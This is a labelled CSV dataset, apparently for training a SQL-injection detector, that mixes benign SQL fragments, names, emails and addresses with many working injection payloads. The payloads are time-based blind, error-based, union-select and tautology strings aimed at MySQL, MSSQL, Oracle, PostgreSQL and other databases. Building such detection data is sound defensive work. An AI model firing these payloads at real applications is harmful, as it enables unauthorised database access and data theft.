Query,Label
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",1
SELECT * FROM hidden FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fifth,0
SELECT * FROM pitch WHERE doing BETWEEN trail09/01/1996likely AND point15/31/1996parts,0
"1'+  (  select 'uijv' where 7279  =  7279 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT TOP 50 PERCENT * FROM wagon,0
erikson@elcarritodelacompra.gw,0
"  SELECT Orders.windowrID, Employees.none, Employees.believed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.freeID ORDER BY Orders.courageID",0
"   SELECT Employees.carry, COUNT ( Orders.referID )  AS dreamFROM    ( OrdersINNER JOIN explanation ON Orders.blowID  =  Employees.exerciseID ) ",0
3500,0
1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",1
for26same8te,0
FROM  ( SELECT DISTINCT hill FROM large ) ,0
-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
SELECT * FROM think WHERE property BETWEEN kill09/01/1996flag AND yourself15/31/1996love,0
"   SELECT paint, swimming, labor FROM wire WHERE closely  IS NULL",0
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",1
-3688'||  (  select 'pber' from dual where 7137  =  7137 order by 1#,1
SELECT movie ( s FROM running RIGHT JOIN,0
SELECT * FROM spring,0
4.79E+15,0
leopolda,0
"1' union all select null,null,null,null,null,null,null--",1
"1%' union all select null,null,null,null,null,null,null#",1
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1
d2s7sp79ro,0
"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',1
SELECT chamber,0
select   (  case when   (  1014  =  4280  )   then 1014 else 1014*  (  select 1014 from mysql.db  )   end  )  #,1
"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
desnudez,0
aventajada,0
SELECT * FROM sum WHERE crack NOT BETWEEN 'pond' AND 'mountain',0
legris@beautifulbody.yu,0
9270,0
1856,0
admin' or '1'  =  '1'/*,1
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
SELECT * FROM dirt WHERE leg = 'sight',0
51842682s,0
"1  )   and elt  (  4249  =  4249,7259  )  ",1
SELECT TOP 50 PERCENT * FROM across SELECT * FROM agree FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1
SELECT * FROM born 3 SELECT * FROM us,0
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1
SELECT any ( s )  FROM close UNION ALL,0
SELECT COUNT ( usID ) FROM blind,0
"1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"   SELECT 'Customer' AS Type, ContactName, City, CountryFROM Customers  UNIONSELECT 'Supplier', ContactName, City, Country",0
SELECT CURTIME (  ) ;,0
SELECT eventually ( s )  FROM double SELECT property FROM wish,0
1'+  (  select mhfn where 2425  =  2425,1
1.00217E+15,0
24596413y,0
SELECT * FROM individual WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31',0
"1""  )   where 7723  =  7723 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
group by userid having 1  =  1--,1
 UPDATE instant SET slowly = 'sometime'WHERE positive = 'care',0
SELECT * FROM handsome FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM except,0
njar,0
2ea6on9s,0
SELECT * FROM north WHERE church = 'especially',0
"SELECT   CONVERT ( ""W3Schools.com"" USING latin1 ) ;",0
"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",1
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
56702228y,0
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--",1
SELECT * FROM identity WHERE burn BETWEEN '1996-07-01' AND '1996-07-31',0
1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',1
"-5245""   )    )     )   union all select 8106,8106,8106#",1
arriharn espinet,0
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"  SELECT * FROM plan WHERE almost NOT IN  ( 'am', 'alike', 'particularly' )  ",0
hinojal,0
harlin,0
"calle san roque, 84,",0
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
mera alccer,0
1  )   and   (  3020  =  3020  )  *6703 and   (  9831  =  9831,1
"paseo francisco mir berlanga 141, 12-e",0
SELECT * FROM flame WHERE men BETWEEN since09/01/1996minute AND teeth15/31/1996rocky,0
1  )   and   (  2342  =  3620  )  *3620,1
29283698y,0
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- viti",1
"  SELECT * FROM layers WHERE mostly NOT IN  ( 'roof', 'rain', 'soon' )  ",0
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1
23611263s,0
"calle gibraltar, 88",0
7o14c0o,0
carlina,0
SELECT * FROM production WHERE bet = 'be' LIMIT 3,0
SELECT * FROM salt WHERE NOT stage = 'examine'  AND NOT day = 'alphabet',0
"SELECT MONTH ( ""2017-06-15 09:34:21"" ) ;",0
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY,0
1 where 8506  =  8506,1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3021' LIMIT 1,0
" SELECT column_name ( s )  FROM difference,damage",0
"-6854"" where 7794  =  7794 union all select 7794,7794--",1
"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0
SELECT mice ( s )  FROM winter,0
solter@aclub.com.ke,0
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob",1
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""pebw"" like ""pebw",1
SELECT * FROM guess WHERE mirror = 'white'  AND  ( gentle = 'fought' OR headed = 'object' ) ,0
SELECT * FROM itself WHERE experience NOT BETWEEN 'sound' AND 'measure',0
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",1
malanquilla,0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'svuu'  =  'svuu,1
l1am217r5,0
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",1
SELECT DISTINCT however FROM instead,0
1 where 8180  =  8180 or sleep  (  5  )  #,1
81717068t,0
"  SELECT eggID AS ID, national AS pay FROM carry",0
"-7691"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3,0
"1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1
SELECT TOP 3 * FROM practice,0
"1""  )   where 9621  =  9621",1
5.62626E+14,0
SELECT TOP 3 * FROM whale,0
" select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",1
SELECT * FROM milk WHERE shelter = 'happy' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
SELECT * FROM Customers LIMIT 3;,0
SELECT nearby ( s )  FROM thumb UNION,0
43120,0
maycel,0
sevilla,0
SELECT COUNT ( DISTINCT share )  FROM warm,0
SELECT AVG ( Price ) FROM available,0
"  SELECT eggID AS ID, sitting AS him FROM throw",0
SELECT * FROM us WHERE history = 'his'  OR enough = 'indeed',0
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1
tristan,0
"   SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperNameFROM     (  (  OrdersINNER JOIN Customers ON Orders.CustomerID  =  Customers.CustomerID )   INNER JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID ) ;",0
"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '",1
"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,1
SELECT AVG ( Price ) FROM able,0
||6,1
"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
canosa,0
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM bank WHERE    NOT word = 'evidence',0
SELECT * FROM model WHERE find LIKE '%cloth%',0
mauer,0
*ayustar,0
"select sleep  (  5  )   and ""%""  =  """,1
"  SELECT * FROM machine WHERE fun NOT IN  ( 'moment', 'condition', 'earlier' )  ",0
SELECT AVG ( manufacturing ) FROM valley SELECT SUM ( see ) ,0
SELECT * FROM needs  WHERE dangerous NOT LIKE '[occasionally]%',0
"  SELECT actualID AS ID, gasoline AS wrote FROM stand",0
handal hach,0
"-6629%""   )    )     )   or 8571  =  8571--",1
committe,0
40359,0
SELECT AVG ( moon ) FROM saw SELECT SUM ( concerned ) ,0
FROM  ( SELECT DISTINCT return FROM call ) ,0
SELECT excitement FROM lunch UNION ALL SELECT human FROM ride ORDER BY leg,0
vilamasa pacheca,0
"   SELECT journey, also, scientificFROM fence WHERE broad  IS NOT NULL",0
SELECT feature FROM although UNION ALL SELECT clear FROM result ORDER BY habit,0
"SELECT SECOND ( ""2017-06-20 09:34:00.000023"" ) ;",0
"   SELECT tomorrow, speak, plastic FROM particular WHERE upper  IS NULL",0
nadir,0
SELECT * FROM brain WHERE activity NOT LIKE 'bush%',0
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"c/ cels gomis i mestre 171,",0
SELECT jump FROM mark UNION SELECT corner FROM coal ORDER BY over,0
"-7412""  )   as qngt where 2041  =  2041 union all select 2041--",1
SELECT * FROM iron WHERE trail  BETWEEN 10 AND 20,0
"   SELECT value,main,trip,one,road     (  (  beside JOIN baby ON wore.free =  lost.spread )   INNER JOIN broughtON Orders.indicate =  page.soundID ) ",0
"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM previous WHERE climb LIKE '%tube%',0
"1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT COUNT ( apart ) FROM pole,0
"-1084'  )   union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ybjo'  =  'ybjo",1
"  SELECT waste AS her, like AS [popular]  FROM shore",0
"   SELECT engineer, shown, scientist FROM physical WHERE exclaimed  IS NULL",0
"iif  (  1095  =  2853,1,1/0  )  ",1
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,1
" SELECT * FROM compass ORDER BY jungle ASC, therefore DESC",0
"1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1
-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,1
harry,0
" select * from users where id  =  1 or ""{{"" or 1  =  1 -- 1",1
"1""  )   where 1607  =  1607",1
talavera,0
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1
querando,0
1  )   as xtgr where 1545  =  1545,1
"calle manuel de falla, 65 5?a",0
SELECT DISTINCT pipe FROM brief,0
SELECT * FROM satellites WHERE comfortable NOT LIKE '[tone]%',0
7.67E+15,0
SELECT AVG ( let )  FROM continent  SELECT SUM ( magic ) ,0
SELECT * FROM front ORDER BY pattern DESC,0
29500,0
"c/ la estrella, 182",0
99ortadero,0
50332,0
c/ coca de la piera 167,0
"-8382""   )    )    order by 1--",1
SELECT AVG ( laugh ) FROM onto,0
"-3731'   )    )     )   or elt  (  7540  =  1412,1412  )   and    (    (     (  'iwch'  =  'iwch",1
SELECT * FROM circus WHERE salt = 'reach'  AND  ( beauty = 'mail' OR flower = 'slabs' ) ,0
SELECT * FROM soldier ORDER BY catch DESC,0
"ferrer del rio, 126 2?h",0
SELECT * FROM pipe ORDER BY safe,0
-1470'   )    )     )   or 9323  =  9323#,1
SELECT * FROM lot WHERE present NOT LIKE '[ever]%',0
SELECT AVG ( great ) FROM product SELECT SUM ( cool ) ,0
1 where 2384  =  2384 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
SELECT club ( s )  FROM drawn SELECT roar ( s ) ,0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1
"  SELECT * FROM wood WHERE empty IN  ( 'stay', 'scale', 'beginning' )  ",0
SELECT personal ( s )  FROM single LEFT JOIN,0
"  SELECT Orders.relationshiprID, Employees.press, Employees.natural FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planningID ORDER BY Orders.dogID",0
SELECT student FROM wore UNION SELECT sang FROM pour ORDER BY habit,0
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",1
waitfor delay '0:0:5' and   (  '%'  =  ',1
1' and 2316  =  7236,1
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ) ,0
sort,0
SELECT * FROM rubber FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT DISTINCT composed FROM figure,0
SELECT * FROM birth ORDER BY plural,0
7012,0
SELECT AVG ( past ) FROM hall SELECT SUM ( property ) ,0
"1%"" union all select null,null--",1
grea,0
"INSERT INTO grade ( chapter, do, graph, exactly, steady, news )  VALUES  ( 'motor', 'cannot'. regular', 'edge', 'burst', 'flag', 'never' )  ",0
SELECT * FROM smooth WHERE lungs = 'gone',0
"SELECT column1 , column2, ... FROM table_name WHERE condition ;",0
promanar,0
"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1
jorge paquirachi,0
"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",1
"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340",1
dax-branson@indianabilljaen.kp,0
"1""  )   as piwi where 2918  =  2918",1
SELECT * FROM magnet WHERE four LIKE '%fat%',0
SELECT AVG ( easily ) FROM sat,0
DELETE FROM mood WHERE folks = 'record',0
"INSERT INTO rapidly  ( afraid, softly, depth )  VALUES  ( 'local', 'rise', 'exercise' )  ",0
3.99279E+14,0
laguna del marquesado,0
"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",1
 ( SELECT column_name FROM table_name WHERE condition  ) ;,0
SELECT * FROM wp_posts WHERE ID  =  347686 LIMIT 1,0
SELECT * FROM like FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM smile WHERE fourth NOT LIKE 'solid%',0
"-6122""  )   union all select 6578,6578--",1
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1
